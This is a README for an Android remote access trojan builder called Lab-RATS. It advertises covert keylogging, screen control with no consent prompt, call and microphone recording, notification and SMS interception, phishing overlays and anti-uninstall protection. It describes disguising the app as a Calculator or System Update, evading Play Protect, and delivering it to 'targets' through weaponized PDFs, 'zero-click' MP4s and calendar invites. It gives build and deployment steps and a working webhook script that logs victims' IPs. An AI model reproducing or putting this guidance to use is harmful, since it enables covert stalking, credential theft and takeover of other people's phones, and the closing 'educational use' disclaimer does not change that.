<p align="center">
  <a href="https://postimg.cc/BXNZCYDS">
    <img src="https://i.postimg.cc/0y16Phyw/app-logo.png)" alt="ic-launcher-playstore.png" />
  </a>

# Lab-RATS

### Advanced Android Remote Administration Tool:

**Lab-RATS** is a **powerful** and **lightweight Remote Administration Tool for Android**. It **builds custom signed `.apk` files** for **deployment onto any Android device** and **enables remote monitoring, interaction and management** through a sleek **web interface(C2)** and **supports the newest modern Android updates/releases**.

---

## 🛡️ Core Features & Security

-   🔐 **Remote C2 Security**: The **web dashboard** is **protected by a secure login wall** (Default Password: **admin1337**). The password can be **updated directly from the Terminal home page** for **enhanced security**.
-   📡 **Secure Handshake Protocol**: Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** (`0x_` prefixed) on the client-side before transmission, rendering them **invisible to browser Network/Payload inspectors**.
-   📦 **Automated APK Generation**: Instantly build `signed.apk` *(for production)*.
-   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
-    **Auto-Density Scaling**: **Resizes logos automatically** for all Android **screen densities**.
-   📱 **PC/Mobile-Responsive**: The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs, and scalable UI elements** for monitoring from **any device**.

---

## 🕵️ Covert & Stealth Operations

-   💉 **NEW!** **Payload Delivery Vectors** *(for installing APK onto Target Device)*: The **weaponization engine** has been overhauled to support **multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and many more)*, ensuring **reliable access** across **all modern mobile environments**.
-   🛡️  **Evasion Engine**: **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
    -   **Deep Stealth HTML Shield**: The C2 interface utilizes **Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the tactical structure is **ghosted from analysts**.
    -   **Web Hardening**: Assets (JS/CSS) are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** (Right-Click, F12) to prevent unauthorized analysis.
    -   **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow and class names** via ProGuard/R8 integration.
    -   **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
-   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the **"Masquerade Library"** of **convincing clones**. **Instantly transform Lab-RATS** into a **Calculator**, **Weather App**, **System Update**, or **Google Play Settings**.
-   🩹 **Self-Healing Protocol**: Automatically detects and **repairs damaged service bindings** or **revoked permissions** in the background.
-   ☎️ **Emergency Recovery Hub**:
     -   **Icon Restore**: If the **launcher icon is in Stealth Mode**, **dial `*#1337#` on the devices dialpad** to **instantly** restore the **Lab-RATS dashboard**.
     -   **Hidden Backdoor**: Every decoy features a **secret bypass**. **Rapidly tapping the middle of the decoy screen display 10 times instantly unlocks** the **C2 server interface**.
-   👻 **Task-List Ghosting**: The app is **hard-coded** to be **invisible in the Android "Recent Apps" list**.
-   🎲 **Dynamic OTA Camouflage**: Generates **random version names and codes** that **mimic legitimate system OTA updates**.

---

## 🚀 The Fun Stuff (Remote Capabilities)

-   👻 **Ghost Operations/Controller**:
    -   **Ghost Screen Control/Mirror**: **Cast & control the live screen remotely** with **NO "Consent Prompt" required**.
    -   **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.
    -   **NEW! Ghost Toast Protocol**: Dispatch **tactical, persistent overlays**. Supports **Custom Colors, Animations (Pop, Static, Scroll)**, and **Chaotic "Burnt Toast" mode** *(multiple random spawns to overwhelm the target)*.
    -   **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
    -   **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
-   🧪 **NEW!** **Exploit Factory Tab**:
    -   **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
    -   **QR Visual Vector**: Dedicated **high-density QR generator** for independent URL delivery.
    -   **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 link injection**.
    -   **Shadow Overlay (Phishing)**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** over the device.
-   💀 **Anti-Removal Shield (Optimized)**:
    -   **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the app.
    -   **Suicide Protocol (Self-Destruct)**: Remote-triggered persistent loop that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.
-   🛰️  **Precision GPS Tracking**: **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
-   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a live feed.
-   📸 **Tactical Surveillance Hub (v1.5.1 Ultra-Stability)**
    -   **Covert Recording**: Stealthily **record video without any user-facing** activity.
    -   **Snap Photos**: Covert **image capture integrated** into the live stream.
    -   **Nightmode V2**: Aggressive **electronic brightening** for **low-light** environments. Now features **Hardware Breathe Sync** and **AE Bypass** for zero-freeze operation on **modern high-latency sensors**.
-   🎙️ **Acoustics & Interception**: **Live microphone recording** and **automated call recording** for both **incoming and outgoing** calls.
-   📂 **Advanced Data Uplink**:
    -   **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an instant **Search Bar** and **Category Filters**.
    -   **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
    -   **📝 Direct File Editor**: Live-edit **text, JSON**, and **log files** directly on the device.
-   📊 **Telemetry & Reporting**:
    -   **C2 Auto-Reporting**: Discrete reporting of **IP, Battery %, Network Type (WiFi/Cellular), and Stealth Status** to a centralized **Google Sheet**.

---

## 🧠 Remote Persistence & Commands

### 🌐 **Direct IPv6 Access** *(P2P connection)*

**Lab-RATS** exploits the **unique traits** of **publicly routable IPv6 addresses** assigned by **modern WIFI/5G/LTE carriers**. By binding the **Lab-RATS** server **directly to the Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any browser in the world without the need** for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*

### 🔄 **Remote Server Restart**

-   **Web UI**: One-click **"RESTART_SERVER"** button on the **Terminal tab** to refresh background services.
-   **SMS Backdoor**: Send an SMS/Text containing `!RESTART_C2` to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.

### 🛠️ **NEW!** **Termux Bridge Integration**

**Lab-RATS** now features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
-   **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are automatically routed through the bridge.
-   **Unrestricted Tools**: Install and run **Python scripts, Nmap scans, or Metasploit** directly from the C2 web terminal.
-   **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.

### 🖥️ **Enhanced Remote Shell**

The **Terminal Tabs Built-in Shell has been overhauled** for professional workflows:
-   **Command History**: Navigate previous commands instantly using **Up/Down arrows**.
-   **System Diagnostics**: New `sysinfo` command for an aggregated hardware/software overview.
-   **Modernized Interface**: Updated to `root@Android` prompt with a built-in `help` menu.
-   **Hardened I/O**: Multi-stage retry logic and unique execution tracking for zero-latency command output.

---

## 📊 **Google Sheet Setup Instructions**

1.  **Create** a new **Google Sheet** for **IP Tracking**.
2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:** *(Supports both GET and POST)*

```javascript
function doGet(e) {
  return handleRequest(e);
}

function doPost(e) {
  return handleRequest(e);
}

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    
    // Check if script is correctly bound to a sheet
    if (!ss) {
      return ContentService.createTextOutput("ERROR: Script not bound to a spreadsheet. Create it from WITHIN the Google Sheet (Extensions -> Apps Script)").setMimeType(ContentService.MimeType.TEXT);
    }

    var sheet = ss.getSheetByName("LabRATS Logs");
    if (!sheet) {
      sheet = ss.insertSheet("LabRATS Logs");
      sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
    }
    
    var data = {};
    
    // Handle POST (JSON body)
    if (e.postData && e.postData.contents) {
      data = JSON.parse(e.postData.contents);
    } 
    // Handle GET (URL parameters)
    else if (e.parameter) {
      data = e.parameter;
    }

    var rowData = [
      new Date(),
      data.device || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "Unknown",
      data.link || "Unknown",
      data.battery || "Unknown",
      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
    ];
    
    sheet.appendRow(rowData);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(your E-mail)* → **Who has Access: Anyone**.
4.  **Important**: **Copy** the **Google Sheet Webhook URL** and **prepare to Paste it** into the **apk-builder** tool **when prompted**. *(Next Section)*

---

## 🛠️ Getting Started

### 1. Requirements
*   **Java 17 or 21 installed** on your **workstation**.
*   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
*   Your **Google Sheet Webhook URL**. *(Previous Section)*

### 2. Building the APK (on PC)
1.  **Download & Extract** the repository.
2.  **Navigate** to `cd /Lab-RATS-main/apk-builder/`
3.  **Execute** the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
4.  **Select a Build Strategy**:
    *   **Option 1 (Manual)**: For basic configuration of App Name, ID, and Logo before building.
    *   **Option 5 (Automated Wizard)**: For the full **Build → Host → Weaponize** flow.
5.  Enter your **Google Sheet Webhook URL** when prompted to enable remote device reporting.
6.  Retrieve your `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `/apk-builder/output/` directory.

### 3. Deploying & Installing onto Android Device

**Deployment is a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.

#### **A. **NEW!** Strategic Weaponization** (The Wrapper)
Standard `.apk` files are **often blocked by email filters and browser security**. Use the **Wizard (Option 5)** in the `apk-builder` to wrap your link inside a **high-compatibility carrier file**:
*   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download**, bypassing **standard PDF security filters**.
*   **🎬 Zero-Click MP4**: Send as a **video file**. It exploits mobile **Media Heap Overflows** during gallery **indexing or thumbnail generation** to **force-register the C2 link in the background**.
*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
*   **🔳 QR Code / 📡 NFC**: Best for physical placement or **"Tap-to-Infect" proximity delivery**. Generates a high-density QR or NDEF record pointing to the hardened delivery URL.
*   **And many more**: The wizard also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document** macros.

#### **B. Hosting Strategies**
*   **Anonymous Cloud**: Option 5 uses **Catbox.moe** by default. It is **anonymous, fast**, and **generates a direct link**.
*   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from another infected device using the `/download/` endpoint.

#### **C. Installation & Initialization**
Once the **Target device** downloads the APK:
1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed_payload.apk`.
2.  **Permissions (Critical)**: Open the app **once**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
    *   **Remote Permission Prompt**: If the **user skips a permission**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
3.  **Self-Vanishing**: 5 seconds after launch, the app will automatically **replace its icon and name** with the decoy you chose during build *("System Update", "Calculator")*. The original icon you chose during the build will **disappear from the launcher**.
4.  **Uplink Confirmation**: Check your **Google Sheet**. Within 10 seconds of initialization, the **active IPv6 address and hardware status will appear in the log**.

---

### 🛡️ **Post-Install Recovery & Management**
*   **Dialer Unlock**: Type `*#1337#` on the phone's keypad to **force the main interface back into view**.
*   **Hidden Backdoor**: If the icon on device is in stealth mode, **rapidly tap the decoy screen display in middle 10 times** to unlock the dashboard.
*   **Anti-Removal**: Enable this in the **Ghost Tab** to **prevent the user from uninstalling** or **force-stopping the app** via Settings.
*   **Web UI**: One-click **"RESTART_SERVER"** button on the **Terminal tab** to refresh background services.
*   **SMS Backdoor**: Send an SMS/Text containing `!RESTART_C2` to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.

---

## ⭐ **Support the Development**

If you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it drives **further development!!**

### **Contributions**
**Bug reports, add new feature** and **pull requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-STAR/CONTRIBUTING.md) for more info)*

---

### **Donations**

**BuyMeACoffee**: https://buymeacoffee.com/k4n3co

**BTC**:

```
bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
```

---

## 📸 **Screenshots/Video Clips**

### Example APK build in Terminal (Mac OS):
> *This build excludes my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google webhook URL to correctly receive the IPv6 address link from the app after installation.*

https://github.com/user-attachments/assets/366df760-df71-455e-aae9-3acf3ef6ed26

---

### Built APK (C2 Server) Installed on Android Device:

<p align="center">
<a href="https://postimg.cc/zySrqv1Z" target="_blank"><img src="https://i.postimg.cc/zySrqv1Z/App-installed-Running.png" alt="App-installed-Running"></a>
<a href="https://postimg.cc/PLXkJHdS" target="_blank"><img src="https://i.postimg.cc/PLXkJHdS/App-installed-Offline.png" alt="App-installed-Offline"></a>

---

### Lab-RATS versus Fully-Patched App Security:

https://github.com/user-attachments/assets/5df5613a-a639-4c80-96ac-50c7a0d015b1

---

### Remotely Transform Lab-RATS into a Working Calculator, Weather App, System Update, or Settings Menu:

<p align="center">
<a href="https://postimg.cc/hhrzqMBt" target="_blank"><img src="https://i.postimg.cc/hhrzqMBt/Stealth-Icons.jpg" alt="Stealth-Icons"></a>    

<p align="center">
<a href="https://postimg.cc/jnqpNR2N" target="_blank"><img src="https://i.postimg.cc/jnqpNR2N/Stealth-Overlays.jpg" alt="Stealth-Overlays"></a>

---

## Remote Web Control (C2) Dashboard - PC Interface

### Remote C2 Panel Video:

https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874

---

### Terminal/Homepage Tab:

[![01-Terminal-Tab.png](https://i.postimg.cc/gkqgDDH7/01-Terminal-Tab.png)](https://postimg.cc/3dNjr26j)

---

### Ghost Operations Tab:

[![02-Ghost-Tab.png](https://i.postimg.cc/3JCtBBFf/02-Ghost-Tab.png)](https://postimg.cc/PPJbf1c1)

---

### Optics/Live Camera Stream Tab:

[![03-Optics-Tab.png](https://i.postimg.cc/QxkfbbJw/03-Optics-Tab.png)](https://postimg.cc/kBGNMWZv)

---

### Locate/Live GPS Tab:

[![04-Locate-Tab.png](https://i.postimg.cc/nhF0wD31/04-Locate-Tab.png)](https://postimg.cc/vcKr4cF1)

---

### (NEW!) Exploit Factory Tab:

[![05-Exploits-Tab.png](https://i.postimg.cc/4xfBF9WB/05-Exploits-Tab.png)](https://postimg.cc/rKH1DKXr)

---

### Data/Storage Tab:

[![06-Data-Tab.png](https://i.postimg.cc/nhF0wD33/06-Data-Tab.png)](https://postimg.cc/ZCQ8WCtN)

---

### Intel/App Notifications Tab:

[![07-Intel-Tab.png](https://i.postimg.cc/HkYBPy6Z/07-Intel-Tab.png)](https://postimg.cc/56rBX6dL)

---

### SMS/Text Message Tab:

[![08-SMS-Tab.png](https://i.postimg.cc/DwvBYXxN/08-SMS-Tab.png)](https://postimg.cc/1fdG8fh0)

---

### MMS/Multimedia Message Tab:

[![09-MMS-Tab.png](https://i.postimg.cc/BnSMwKmk/09-MMS-Tab.png)](https://postimg.cc/WhyGdhLw)

---

### Acoustics/Audio Tab:

[![10-Acoustics-Tab.png](https://i.postimg.cc/zGz0Pgx9/10-Acoustics-Tab.png)](https://postimg.cc/VdhqJdQR)

---

### Comms/Call Logs Tab:

[![11-Comms-Tab.png](https://i.postimg.cc/SxSDtMZ0/11-Comms-Tab.png)](https://postimg.cc/6yPr8yJz)

---

### Contacts Tab:

[![12-Contacts-Tab.png](https://i.postimg.cc/zGz0Pgdr/12-Contacts-Tab.png)](https://postimg.cc/tYc3sYQS)

---

### Hardware/Device Info Tab:

[![13-Hardware-Tab.png](https://i.postimg.cc/VkfDHC7m/13-Hardware-Tab.png)](https://postimg.cc/ykGmDk4b)

---

## 📱 Remote Web Control (C2) Panel - Mobile Interface *(A Few Examples)*

<p align="center">
<a href="https://postimg.cc/nXZxpmhT" target="_blank"><img src="https://i.postimg.cc/nXZxpmhT/Lab-RATS-Mobile-C2-Home.jpg" alt="Lab-RATS-Mobile-C2-Home"></a> <a href="https://postimg.cc/dhvFwCVB" target="_blank"><img src="https://i.postimg.cc/dhvFwCVB/Lab-Rats-Mobile-C2-Ghost1.jpg" alt="Lab-Rats-Mobile-C2-Ghost1"></a> <a href="https://postimg.cc/HrHmdMk9" target="_blank"><img src="https://i.postimg.cc/HrHmdMk9/Lab-RATS-Mobile-C2-Ghost2.jpg" alt="Lab-RATS-Mobile-C2-Ghost2"></a> <a href="https://postimg.cc/cvZW03Lk" target="_blank"><img src="https://i.postimg.cc/cvZW03Lk/Lab-RATS-Mobile-C2-Optics.jpg" alt="Lab-RATS-Mobile-C2-Optics"></a> <a href="https://postimg.cc/jDKTtfSZ" target="_blank"><img src="https://i.postimg.cc/jDKTtfSZ/Lab-RATS-Mobile-C2-GPS.jpg" alt="Lab-RATS-Mobile-C2-GPS"></a>

---

## ⚠️ **Disclaimer**
This tool is for **educational and authorized security testing purposes ONLY**. The **developers** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**

---

© 2026 **K4N3CO.LABS**
